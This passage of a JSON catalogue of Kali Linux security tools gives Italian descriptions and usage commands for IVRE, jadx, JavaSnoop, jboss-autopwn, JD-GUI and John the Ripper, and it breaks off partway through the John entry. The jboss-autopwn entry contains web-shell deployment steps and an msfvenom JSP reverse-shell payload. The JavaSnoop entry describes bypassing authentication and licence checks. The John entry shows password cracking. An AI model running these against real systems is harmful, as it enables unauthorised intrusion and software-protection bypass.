    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>IVRE</strong> (Instrument de Veille sur les Réseaux Extérieurs) è un framework enterprise-grade per la raccolta, archiviazione, e analisi di dati di network reconnaissance su larga scala. Progettato originariamente per operazioni di intelligence su internet, IVRE può gestire miliardi di record provenienti da Nmap, Masscan, ZGrab, e altri scanner. Il sistema usa MongoDB per lo storage e offre una web interface interattiva per visualizzazione, query complesse, e analisi statistica. Include anche un potente sistema CLI per scripting e automazione. IVRE trasforma dati di scansione grezzi in intelligence actionable, permettendo di correlare servizi, identificare pattern, tracciare cambiamenti nel tempo, e generare report dettagliati. È lo strumento ideale per chi deve gestire reconnaissance di interi range IP, ASN, o internet-wide scan.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Data Ingestion:</strong> Importa dati da tutti i principali scanner: Nmap (XML), Masscan (JSON/XML), ZMap/ZGrab (JSON), Shodan, Censys export, e formati custom. Normalizza i dati in un formato comune mantenendo tutti i dettagli originali. Supporta import incrementale per scan ricorrenti con deduplicazione intelligente.</p><p><strong>Advanced Web Interface:</strong> La GUI web permette ricerche complesse con query language potente: cerca per IP range, servizio, porta, banner, CPE, paese, ASN, e combinazioni arbitrarie. Visualizza risultati su mappa geografica, genera grafici di distribuzione, e permette drill-down interattivo. Screenshot di servizi web catturati sono visualizzabili inline.</p><p><strong>Powerful Query Language:</strong> Il query language supporta operatori complessi: regex su banner, CIDR matching, port range, confronti temporali, e operatori booleani. Permette query come 'tutti gli host con SSH versione < 7.0 nel range 10.0.0.0/8 che hanno anche porta 3389 aperta' in una singola espressione.</p><p><strong>Flow Analysis (Passive DNS/NetFlow):</strong> Oltre agli scan attivi, IVRE può importare e analizzare dati passivi: passive DNS records, NetFlow/sFlow, e IPFIX. Questo permette di correlare dati di scansione con traffico reale osservato, identificando relazioni tra host e domini.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Inizializza database MongoDB\nivre ipinfo --init\nivre scancli --init\nivre passiverecon --init\n\n# === IMPORT SCAN ===\n# Import scan Nmap\nivre scan2db -s myscan nmap_output.xml\n\n# Import scan Masscan\nivre scan2db -s masscan_scan masscan_output.json\n\n# Import multipli file\nivre scan2db -s recon scans/*.xml\n\n# Import con categoria/tag\nivre scan2db -s corp_network --category internal scans/*.xml\n\n# === WEB INTERFACE ===\n# Avvia web server\nivre httpd --bind 0.0.0.0 --port 8080\n# Accedi via browser: http://localhost:8080\n\n# === CLI QUERIES ===\n# Trova host per IP\nivre scancli --host 192.168.1.1\n\n# Cerca per range CIDR\nivre scancli --net 10.0.0.0/8\n\n# Cerca servizi specifici\nivre scancli --service http\nivre scancli --service ssh --port 22\n\n# Banner matching con regex\nivre scancli --script http-title --grep \"login\"\n\n# Versioni specifiche\nivre scancli --service openssh --version \"7.2\"\n\n# Combinazioni complesse\nivre scancli --net 192.168.0.0/16 --openport 445 --openport 3389\n\n# === EXPORT ===\n# Export JSON\nivre scancli --net 10.0.0.0/8 --json > network_scan.json\n\n# Export CSV\nivre scancli --service ssh --csv > ssh_hosts.csv\n\n# === STATISTICHE ===\n# Top porte\nivre scancli --top port\n\n# Top servizi\nivre scancli --top service\n\n# Top prodotti\nivre scancli --top product\n\n# === PASSIVE DNS ===\n# Import passive DNS\nivre passiverecon2db pdns_data.json\n\n# Query passive recon\nivre passiverecon --domain example.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Enterprise Attack Surface Management</strong>, IVRE permette di mantenere un inventario continuo di tutti gli asset esposti. Import regolari da scan programmati (Masscan per discovery, Nmap per service detection) creano un database storico che traccia cambiamenti: nuovi host, nuovi servizi, versioni cambiate. Alert su variazioni critiche come nuove porte esposte.</p><p>Nelle <strong>Red Team Operations</strong>, dopo la fase di scanning esterno, IVRE centralizza tutti i dati di recon. La web interface permette di esplorare interattivamente i risultati, identificare target promettenti (versioni vulnerabili, servizi interessanti), e pianificare gli attacchi. Query salvate possono essere riutilizzate su nuovi scan.</p><p>Per <strong>Threat Intelligence e Research</strong>, IVRE può processare internet-wide scan (Shodan, Censys download) per analisi su larga scala. Identifica distribuzione geografica di servizi, traccia adoption di nuove versioni, monitora cambiamenti nel tempo. Utile per research su vulnerabilità o trend di deployment.</p><p>Nel <strong>Bug Bounty Reconnaissance</strong>, importa scan di tutti i target in scope in un database unificato. Cerca pattern vulnerabili (outdated versions, interesting tech stack) attraverso tutti i programmi simultaneamente. Traccia quali target hai già testato e quali hanno cambiato configurazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>IVRE is Passive:</strong> IVRE stesso non esegue scan, analizza solo dati. Non genera traffico di rete verso i target. Tuttavia, i dati che analizza provengono da scan attivi che hanno proprie implicazioni OPSEC.</p><p><strong>Database Security:</strong> Il database IVRE contiene informazioni sensibili su infrastrutture. Proteggere l'accesso: binding su localhost, authentication MongoDB, cifratura at rest. Non esporre la web interface su internet senza autenticazione.</p><p><strong>Data Retention:</strong> Conservare dati di scan su terze parti potrebbe avere implicazioni legali. Definire policy di retention appropriate. I dati storici sono utili ma aumentano anche il rischio in caso di breach del sistema IVRE.</p><p><strong>Resource Requirements:</strong> Per dataset grandi (milioni di host), IVRE richiede risorse significative: RAM per MongoDB, storage per database e screenshot, CPU per query complesse. Pianificare capacità appropriata per il volume di dati atteso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "jadx",
    "name": "jadx",
    "version": "1.5.2",
    "icon": "../app/icons/jadx-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jadx/",
    "desc": "Decompiler Android che converte DEX/APK in codice Java leggibile con GUI integrata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JADX</strong> è il decompiler Android più avanzato e user-friendly disponibile, capace di convertire file APK e DEX in codice Java sorgente altamente leggibile. A differenza di altri decompiler che producono output difficile da comprendere, JADX genera codice pulito con nomi di variabili recuperati (quando possibile), commenti sui bytecode originali, e struttura del codice fedele all'originale. Include una GUI potente con navigazione del codice, ricerca globale, cross-reference, e visualizzazione delle risorse (layout XML, strings, assets). Per la command line, supporta export in formato Gradle project completo, permettendo di aprire il codice decompilato direttamente in Android Studio per ulteriore analisi. JADX è lo strumento fondamentale per reverse engineering Android, security assessment di applicazioni mobile, analisi malware, e bug bounty su target mobile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Advanced Decompilation Engine:</strong> Converte Dalvik bytecode in Java source con alta fedeltà. Gestisce correttamente costrutti complessi: inner classes, lambda expressions, try-with-resources, switch su stringhe. Ricostruisce enum, annotation, e generics. Output significativamente più leggibile rispetto a tool legacy come dex2jar+JD-GUI.</p><p><strong>Integrated Deobfuscation:</strong> Quando il codice è offuscato (ProGuard, R8, DexGuard), JADX può rinominare classi, metodi e variabili con nomi più leggibili basandosi su heuristics. Mantiene mapping tra nomi originali e rinominati. Permette anche import di ProGuard mapping file per reverse della obfuscation se disponibile.</p><p><strong>Resource Analysis:</strong> Decompila completamente le risorse Android: layout XML con ID risolti, strings.xml in tutte le lingue, AndroidManifest con permessi e componenti, assets e raw files. Permette di correlare codice con UI e identificare entry points (activities, receivers, services).</p><p><strong>GUI Navigation e Search:</strong> La GUI supporta: click su classi/metodi per navigazione, find usages (chi chiama questo metodo), global search con regex, filtri per tipo, bookmarks, e export selettivo. Tabs multiple per confrontare codice. Syntax highlighting e code folding per leggibilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === GUI MODE ===\n# Avvia interfaccia grafica\njadx-gui\n# File -> Open -> seleziona APK o DEX\n\n# Apri direttamente un file\njadx-gui app.apk\n\n# === CLI DECOMPILATION ===\n# Decompila APK in directory\njadx -d output_directory app.apk\n\n# Decompila con deobfuscation\njadx --deobf -d output app.apk\n\n# Deobfuscation aggressiva\njadx --deobf --deobf-min 2 --deobf-use-hierarchic -d output app.apk\n\n# Export come progetto Gradle (apribile in Android Studio)\njadx -e -d android_project app.apk\n\n# === OPZIONI AVANZATE ===\n# Aumenta threads per APK grandi\njadx -j 8 -d output app.apk\n\n# Mostra più dettagli (comments con bytecode)\njadx --show-bad-code -d output app.apk\n\n# Skip risorse (solo codice)\njadx --no-res -d output app.apk\n\n# Forza sovrascrittura\njadx --overwrite -d output app.apk\n\n# === ANALISI SPECIFICA ===\n# Cerca API keys hardcoded\ngrep -r \"api_key\\|apikey\\|api-key\\|secret\" output/sources/\n\n# Cerca URL endpoints\ngrep -rE \"https?://[^\\\"']+\" output/sources/\n\n# Cerca Firebase config\ngrep -r \"firebase\\|firebaseio.com\" output/\n\n# Trova WebViews (potenziali XSS)\ngrep -r \"addJavascriptInterface\\|setJavaScriptEnabled\" output/\n\n# Cerca SQL queries (potenziale injection)\ngrep -r \"rawQuery\\|execSQL\" output/sources/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Mobile Application Security Assessment</strong>, JADX è il primo passo per analizzare un'app Android. Esamina l'implementazione di autenticazione, storage di credenziali, comunicazioni di rete, e gestione di dati sensibili. Identifica vulnerabilità come hardcoded secrets, insecure data storage, improper certificate validation, e SQL injection in ContentProviders.</p><p>Per <strong>Android Malware Analysis</strong>, JADX permette di capire cosa fa un'app malevola: quali permessi usa realmente, come comunica con C2, come ottiene persistenza, come esfiltra dati. La GUI rende facile seguire il flusso di esecuzione dall'entry point ai payload. Combina con emulatori o Frida per analisi dinamica.</p><p>Durante <strong>Bug Bounty su Target Mobile</strong>, molti programmi includono app Android in scope. JADX rivela API endpoints non documentati, business logic flaws, authentication bypass, e information disclosure. Le API keys e secrets hardcoded sono finding comuni. Esporta in Gradle per test con Android Studio.</p><p>Per <strong>Competitive Analysis e Research</strong>, capire come competitor implementano features specifiche. JADX permette di studiare algoritmi, protocolli proprietari, e implementazioni di sicurezza. Utile anche per ricercatori che studiano tracking, ads SDK, e privacy practices delle app.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Completely Offline:</strong> JADX opera completamente in locale. Non invia dati a server esterni, non richiede connessione internet. L'analisi non lascia tracce rilevabili dal publisher dell'app. Ideale per analisi che devono rimanere confidenziali.</p><p><strong>Anti-Decompilation Measures:</strong> Alcune app usano packer (DexProtector, Qihoo 360) che criptano il DEX. JADX non può decompilare codice criptato senza prima unpacking. Altri usano native code (JNI/NDK) che richiede analisi separata con IDA/Ghidra. Reflection e dynamic loading possono nascondere funzionalità.</p><p><strong>Obfuscation Challenges:</strong> Obfuscation aggressiva (DexGuard commercial) può rendere il codice molto difficile da capire anche dopo deobfuscation. Nomi come 'a.a.a.a()' richiedono analisi manuale per comprendere il significato. String encryption richiede analisi dinamica o emulazione per rivelare i valori.</p><p><strong>Legal Considerations:</strong> In molte giurisdizioni, reverse engineering per security research è legale. Tuttavia, redistribuire codice decompilato, aggirare DRM, o violare EULA può avere conseguenze legali. Documentare lo scopo dell'analisi e rispettare responsible disclosure.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "javasnoop",
    "name": "javasnoop",
    "version": "1.1",
    "icon": "../app/icons/javasnoop-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/javasnoop/",
    "desc": "Intercetta e modifica chiamate a metodi Java a runtime per analisi applicazioni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JavaSnoop</strong> è uno strumento di dynamic analysis per applicazioni Java che permette di intercettare, monitorare e modificare chiamate a metodi a runtime. Funziona agganciandosi (attach) a processi Java in esecuzione tramite Java Agent API, permettendo di inserire hook su qualsiasi metodo di qualsiasi classe caricata nella JVM. Una volta agganciato, JavaSnoop può: loggare ogni invocazione di metodi specifici con parametri e return value, modificare i parametri prima che il metodo venga eseguito, alterare i valori di ritorno prima che arrivino al chiamante, e persino bypassare completamente l'esecuzione di metodi. La GUI intuitiva permette di navigare le classi caricate, selezionare metodi da monitorare, e definire regole di tampering senza scrivere codice. È particolarmente utile per security testing di applicazioni Java thick-client e per comprendere la logica di applicazioni closed-source.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Runtime Method Hooking:</strong> Inserisce hook su qualsiasi metodo Java a runtime senza modificare il bytecode su disco. Supporta hooking di metodi di classi applicative, librerie, e persino classi del JDK. Gli hook possono essere aggiunti e rimossi dinamicamente mentre l'applicazione è in esecuzione.</p><p><strong>Parameter Tampering:</strong> Intercetta e modifica i parametri passati ai metodi prima dell'esecuzione. Permette di bypassare validazioni client-side modificando valori di input. Supporta tampering di primitive, oggetti, e strutture dati complesse con editor integrato.</p><p><strong>Return Value Modification:</strong> Modifica i valori ritornati dai metodi prima che arrivino al codice chiamante. Cruciale per bypassare controlli di autorizzazione (forza ritorno 'true' da isAuthorized()), licensing (checkLicense() sempre valido), o qualsiasi logica di validazione.</p><p><strong>Execution Control:</strong> Permette di bloccare completamente l'esecuzione di metodi selezionati o sostituire l'implementazione con custom code. Utile per neutralizzare funzioni di security o anti-tampering nell'applicazione target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO ===\n# Avvia JavaSnoop (richiede Java)\njavasnoop\n\n# === WORKFLOW GUI ===\n# 1. ATTACH A PROCESSO\n# - File -> New Session -> Attach to existing JVM\n# - Seleziona il processo Java target dalla lista\n# - Oppure: avvia nuova applicazione da JavaSnoop\n\n# 2. ESPLORA CLASSI\n# - Browse le classi caricate nella JVM\n# - Usa filtri per trovare classi di interesse\n# - Identifica metodi da targetizzare\n\n# 3. CONFIGURA HOOK\n# - Click destro su metodo -> Add Hook\n# - Configura azioni: Log, Modify Params, Modify Return\n# - Imposta condizioni per trigger\n\n# 4. TAMPERING RULES\n# Per bypass login:\n#   Metodo: com.app.auth.AuthManager.validateCredentials\n#   Action: Always return TRUE\n\n# Per bypass license:\n#   Metodo: com.app.license.LicenseChecker.isValid\n#   Action: Always return TRUE\n\n# Per monitoring:\n#   Metodo: com.app.crypto.Encryptor.encrypt\n#   Action: Log parameters and return value\n\n# 5. OSSERVA E TESTA\n# - Usa l'applicazione normalmente\n# - JavaSnoop mostra ogni chiamata hookkata\n# - Verifica che tampering funzioni\n\n# === SCENARI COMUNI ===\n# Bypass autenticazione: hook su metodi auth\n# Bypass licensing: hook su metodi license check\n# Decrypt communications: log parametri crypto\n# Modificare logica business: alter return values</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Security Testing di Thick-Client Java</strong>, molte applicazioni enterprise sono thick-client Java (fat JAR, JavaFX, Swing). JavaSnoop permette di bypassare validazioni client-side, testare cosa succede quando controlli di sicurezza vengono neutralizzati, e verificare se il server valida adeguatamente.</p><p>Nel <strong>Reverse Engineering di Applicazioni</strong>, quando il codice sorgente non è disponibile, JavaSnoop fornisce visibilità dinamica su come l'applicazione funziona. Loggando chiamate a metodi chiave si può ricostruire la logica di business senza decompilare.</p><p>Per <strong>Bypass License e DRM</strong>, le protezioni software Java spesso si basano su controlli client-side. JavaSnoop può identificare e neutralizzare questi controlli facendo ritornare sempre true/valid dai metodi di verifica. Utile per security research e testing.</p><p>Durante <strong>Malware Analysis Java</strong>, analisi dinamica di malware Java in sandbox. JavaSnoop permette di monitorare chiamate a API di rete, file system, crypto, e altre funzioni critiche per comprendere il comportamento del malware senza eseguirlo liberamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Local Access Required:</strong> JavaSnoop richiede accesso locale al sistema dove l'applicazione Java è in esecuzione. Non è un tool di attacco remoto. L'agent injection necessita permessi per attach alla JVM.</p><p><strong>Detection Possible:</strong> L'applicazione può rilevare che è sotto debug/instrumentation controllando proprietà JVM, presenza di agent, o timing anomali. Applicazioni security-sensitive implementano anti-tampering.</p><p><strong>Tool Maturity:</strong> JavaSnoop è un progetto datato con sviluppo limitato. Per applicazioni moderne, considerare alternative come Frida (con frida-java-bridge), o JRebel per hot-reload, o Byte Buddy per instrumentation programmatica.</p><p><strong>JVM Compatibility:</strong> Alcune versioni di Java e configurazioni JVM potrebbero non permettere attach di agent o potrebbero avere restrizioni su instrumentation. Java 9+ con moduli può complicare l'accesso a internal classes.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "jboss-autopwn",
    "name": "jboss-autopwn",
    "version": "0.1",
    "icon": "../app/icons/jboss-autopwn-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jboss-autopwn/",
    "desc": "Exploit automatico per JBoss/WildFly: deploy webshell via JMX e invoker servlet.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JBoss-autopwn</strong> è uno script automatizzato per l'exploitation di server JBoss Application Server e WildFly con misconfigurazioni di sicurezza comuni. Il tool sfrutta una serie di vettori d'attacco tipici di installazioni JBoss non hardened: JMX Console esposta senza autenticazione (o con credenziali default), web-console accessibile pubblicamente, JMXInvokerServlet e EJBInvokerServlet non protetti, e altri endpoint amministrativi. Quando una di queste vulnerabilità è presente, JBoss-autopwn può automaticamente deployare un WAR malevolo contenente una web shell o un reverse shell payload, ottenendo code execution completo sul server. Sebbene JBoss moderno (WildFly) abbia migliorato significativamente il security posture di default, molte installazioni legacy rimangono vulnerabili, specialmente in ambienti enterprise dove l'upgrade è complesso.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>JMX Console Exploitation:</strong> La JMX Console (porta 8080/jmx-console) permette di interagire con MBeans del server. Se accessibile senza auth, permette deploy di applicazioni, esecuzione di codice, e controllo completo del server. JBoss-autopwn usa l'MBean jboss.system:MainDeployer per deployare WAR malevoli.</p><p><strong>Web-Console Exploitation:</strong> La web-console (/web-console) fornisce interfaccia grafica per amministrazione. Se non protetta, permette navigazione del filesystem del server, deploy di applicazioni, e modifica configurazioni. Altro vettore per ottenere code execution.</p><p><strong>Invoker Servlet Attacks:</strong> JMXInvokerServlet e EJBInvokerServlet permettono invocazione remota di MBeans via HTTP. Storicamente vulnerabili a Java deserialization attacks (CVE-2017-12149, CVE-2015-7501). JBoss-autopwn può sfruttare queste vulnerabilità per RCE diretto.</p><p><strong>Automated Payload Deployment:</strong> Una volta identificato un vettore funzionante, il tool genera e deploya automaticamente un WAR con web shell JSP. La shell permette esecuzione comandi, file browsing, upload/download, e accesso persistente al server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === EXPLOITATION AUTOMATICA ===\n# Scan e sfrutta automaticamente tutte le vulnerabilità\njboss-autopwn target.com 8080\n\n# Specificare porta alternativa\njboss-autopwn target.com 9990\n\n# === OPZIONI SPECIFICHE ===\n# Solo detection (non exploita)\njboss-autopwn -d target.com 8080\n\n# Usa payload WAR custom\njboss-autopwn -p custom_shell.war target.com 8080\n\n# Specificare vettore d'attacco\njboss-autopwn --jmx target.com 8080\njboss-autopwn --webconsole target.com 8080\njboss-autopwn --invoker target.com 8080\n\n# === WORKFLOW MANUALE ===\n# 1. Verifica JMX Console\ncurl http://target:8080/jmx-console/\n\n# 2. Se accessibile, usa MainDeployer per deploy\n# Via browser: JMX Console -> jboss.system -> MainDeployer\n# deploy() -> URL del WAR malevolo\n\n# 3. Accedi alla web shell deployata\ncurl http://target:8080/shell/cmd.jsp?cmd=id\n\n# === GENERARE PAYLOAD ===\n# Crea WAR con JSP shell\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war > shell.war\n\n# Oppure usa cmd.war dalla suite\n# Contiene semplice command execution JSP</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Enterprise Penetration Testing</strong>, JBoss è comune in ambienti enterprise Java. Installazioni vecchie o mal configurate con console di amministrazione esposte rappresentano quick win per ottenere foothold iniziale. JBoss-autopwn automatizza la discovery e l'exploitation.</p><p>Per <strong>Legacy Application Assessment</strong>, molte applicazioni critiche girano su JBoss 4.x/5.x/6.x mai aggiornate. Questi server hanno configurazioni di default insicure. Verificare se gli endpoint di amministrazione sono esposti è parte essenziale dell'assessment.</p><p>Nel <strong>Red Team Operations</strong>, una volta identificato un JBoss esposto via scanning, JBoss-autopwn permette rapida exploitation per ottenere accesso. Da lì, il server può essere usato per pivoting nella rete interna o per raccogliere credenziali da configurazioni.</p><p>Durante <strong>Vulnerability Validation</strong>, dopo aver identificato potenziali JBoss vulnerabili con scanner come Nmap/Nessus, JBoss-autopwn conferma l'exploitabilità effettiva e il livello di accesso ottenibile.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Visibility:</strong> L'accesso a /jmx-console/ e /web-console/ genera log distintivi. Il deploy di WAR è loggato nei log del server JBoss. La web shell su disco è persistente e rilevabile da antivirus e file integrity monitoring.</p><p><strong>WAR Artifacts:</strong> Il WAR deployato rimane sul server fino a undeploy esplicito. Lascia tracce evidenti nella directory di deploy. Considerare undeploy e cleanup dopo aver ottenuto accesso alternativo (reverse shell, credenziali).</p><p><strong>IDS/IPS Detection:</strong> I pattern di JMX Console exploitation sono ben noti. Signature IDS/IPS esistono per rilevare questi attacchi. Web Application Firewall possono bloccare l'accesso alle console di amministrazione.</p><p><strong>Version Considerations:</strong> WildFly moderno (JBoss 8+) ha security by default significativamente migliore. Console protette da autenticazione, management interface su porta separata (9990), e configurazione più restrittiva. Tool più efficace su versioni legacy.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "JBoss_&_WildFly"
    ],
    "notes": null
  },
  {
    "id": "jd-gui",
    "name": "jd-gui",
    "version": "1.6.6",
    "icon": "../app/icons/jd-gui-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jd-gui/",
    "desc": "GUI per decompilare JAR e class file Java in codice sorgente leggibile.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JD-GUI</strong> è un decompilatore Java standalone con interfaccia grafica user-friendly che converte file .class compilati e archivi JAR/WAR/EAR in codice sorgente Java leggibile. A differenza del bytecode raw, il codice decompilato risulta quasi identico all'originale, con nomi di variabili, strutture di controllo, e commenti inferiti dal bytecode. JD-GUI utilizza il motore JD-Core, uno dei decompilatori Java più accurati disponibili, capace di gestire costrutti complessi come inner classes, lambda expressions (Java 8+), e generics. È lo strumento primario per reverse engineering di applicazioni Java, analisi di malware, security audit di librerie third-party, e recupero di codice sorgente perduto.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High-Fidelity Decompilation:</strong> Il motore JD-Core ricostruisce codice sorgente quasi identico all'originale, gestendo correttamente costrutti complessi come try-with-resources, enhanced for loops, switch expressions, e lambda. Supporta tutte le versioni Java da 1.1 a 17+.</p><p><strong>Archive Navigation:</strong> Apre direttamente archivi JAR, WAR, EAR mostrando la struttura completa dei package in tree view. Navigazione point-and-click tra classi e metodi con hyperlink automatici per riferimenti cross-class.</p><p><strong>Search Capabilities:</strong> Ricerca full-text nel codice decompilato, ricerca di classi per nome, e find usages per identificare dove metodi e campi vengono utilizzati. Essenziale per analizzare codebase complesse.</p><p><strong>Export Completo:</strong> Esporta singole classi o interi archivi come file .java. L'export preserva la struttura dei package creando la corretta gerarchia di directory. Utile per creare progetti IDE importabili per analisi approfondita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>JD-GUI è primariamente un tool grafico, ma supporta apertura da command line per integrazione in workflow.</p><pre><code># Avvia interfaccia grafica\njd-gui\n\n# Apri file specifico direttamente\njd-gui target-application.jar\njd-gui SuspiciousClass.class\n\n# Apertura multipla\njd-gui app.jar lib1.jar lib2.jar\n\n# Da GUI - workflow tipico:\n# 1. File -> Open -> seleziona JAR/WAR/EAR\n# 2. Navigate nella tree view dei package\n# 3. Click su classe per vedere codice decompilato\n# 4. Ctrl+F per search nel file corrente\n# 5. Ctrl+Shift+F per search globale\n# 6. Click su riferimenti per navigare a definizione\n# 7. File -> Save All Sources per export completo\n\n# Export da command line (se supportato dalla versione)\njd-cli -od output_dir/ target.jar</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Security Audit di Dipendenze</strong>, quando si utilizzano librerie third-party closed-source, JD-GUI permette di ispezionare il codice per vulnerabilità, backdoor, o comportamenti non documentati. Particolarmente importante per librerie di autenticazione, encryption, o networking.</p><p>Nell'<strong>Analisi Malware Java</strong>, trojan, RAT, e ransomware scritti in Java possono essere completamente analizzati. JD-GUI rivela logica di C2 communication, meccanismi di persistence, payload, e encryption keys hardcoded.</p><p>Per <strong>Vulnerability Research</strong>, decompilare applicazioni enterprise (J2EE, Spring) permette di identificare injection points, authentication bypass, insecure deserialization, e altre vulnerabilità non visibili in black-box testing.</p><p>Nel <strong>Source Code Recovery</strong>, quando il codice sorgente originale è perduto, JD-GUI permette di ricostruire una versione leggibile e modificabile. Utile per legacy applications dove i sorgenti non esistono più.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Operazione Offline:</strong> JD-GUI opera completamente in locale senza connessioni di rete. L'analisi non lascia tracce esterne e può essere eseguita su macchine air-gapped per analisi di malware sensibile.</p><p><strong>Limitazioni Obfuscation:</strong> Codice offuscato con tool come ProGuard, DexGuard, o Zelix KlassMaster risulta difficile da leggere. Nomi di classi/metodi/variabili vengono sostituiti con stringhe meaningless (a, b, aa, etc.). Control flow obfuscation può rendere la logica incomprensibile.</p><p><strong>Contromisure:</strong> Per codice offuscato, combinare JD-GUI con de-obfuscator come java-deobfuscator o analisi dinamica. Per analisi malware, eseguire in VM isolata poiché alcuni malware rilevano ambiente di analisi.</p><p><strong>Legalità:</strong> Decompilazione può violare EULA/ToS di software commerciale. Verificare implicazioni legali prima di analizzare software proprietario al di fuori di contesti di security research autorizzato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "john-kali",
    "name": "john",
    "version": "1.9.0",
    "icon": "../app/icons/john-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/john/",
    "desc": "Password cracker storico con supporto per centinaia di hash type e regole avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>John</strong> the Ripper è il password cracker più storico, versatile e rispettato nel campo della security. Sviluppato originariamente nel 1996, rimane lo strumento di riferimento per cracking di password offline grazie al supporto per oltre 400 tipi di hash e alla continua evoluzione. La versione 'Jumbo' community-enhanced estende enormemente le capacità originali includendo formati moderni come bcrypt, scrypt, Argon2, hash cloud (AWS, Azure), cryptocurrency wallets, e formati enterprise (SAP, Oracle, Kerberos). John offre multiple modalità di attacco: wordlist con regole di mutation, brute force incrementale con charset configurabili, e modalità single basata su informazioni username. L'architettura modulare permette facile aggiunta di nuovi formati. Supporta accelerazione OpenMP per multi-threading CPU e, nella versione Jumbo, anche GPU con OpenCL/CUDA per hash lenti come bcrypt.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massive Format Support:</strong> Supporta oltre 400 tipi di hash: Unix crypt variants (DES, MD5, SHA-256/512, bcrypt, yescrypt), Windows (LM, NTLM, NTLMv2, MSCACHE), Kerberos (TGT, AS-REP, TGS-REP), database (Oracle, MySQL, PostgreSQL, MSSQL), archivi (ZIP, RAR, 7z, PDF, Office), web (WordPress, phpBB, Drupal), e molti altri. Auto-detection del formato quando possibile.</p><p><strong>Powerful Wordlist Mode:</strong> Attacco dizionario con regole di mutation che trasformano ogni parola della wordlist in centinaia di varianti: capitalize, append numbers, leet speak, common substitutions. Le regole John sono un linguaggio completo per descrivere trasformazioni. Include preset (best64, KoreLogic) e supporta regole custom.</p><p><strong>Incremental Mode:</strong> Brute force intelligente che usa modelli statistici di frequenza caratteri. Invece di provare aaaaa, aaaab, genera candidati in ordine di probabilità basato su pattern reali di password. Molto più efficiente di brute force puro per password human-generated.</p><p><strong>External Modes:</strong> Permette di definire generatori di password custom in linguaggio C-like. Utile per generare candidati basati su pattern specifici del target: date, numeri di telefono, policy aziendali note.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === BASIC CRACKING ===\n# Auto-detect format e crack con wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Formato specifico (quando auto-detect fallisce)\njohn --format=Raw-SHA256 --wordlist=rockyou.txt hashes.txt\njohn --format=NT --wordlist=rockyou.txt ntlm.txt\njohn --format=bcrypt --wordlist=rockyou.txt bcrypt.txt\n\n# Lista formati supportati\njohn --list=formats | grep -i \"sha\"\n\n# === RULES ===\n# Wordlist con regole default\njohn --wordlist=words.txt --rules hashes.txt\n\n# Regole specifiche (KoreLogic più aggressive)\njohn --wordlist=words.txt --rules=KoreLogic hashes.txt\n\n# Best64 rules (ottimo rapporto velocità/coverage)\njohn --wordlist=rockyou.txt --rules=best64 hashes.txt\n\n# === MODALITÀ AVANZATE ===\n# Incremental mode (brute force intelligente)\njohn --incremental hashes.txt\n\n# Incremental con charset specifico\njohn --incremental=digits hashes.txt  # Solo numeri\njohn --incremental=lower hashes.txt   # Solo lowercase\n\n# Single mode (usa username per generare candidati)\njohn --single hashes.txt\n\n# === GESTIONE SESSIONE ===\n# Mostra password craccate\njohn --show hashes.txt\njohn --show --format=NT ntlm.txt\n\n# Resume sessione interrotta\njohn --restore\njohn --restore=session_name\n\n# Status durante cracking\n# Premi qualsiasi tasto per status\n# Ctrl+C per salvare e uscire\n\n# === FORMATI SPECIFICI ===\n# 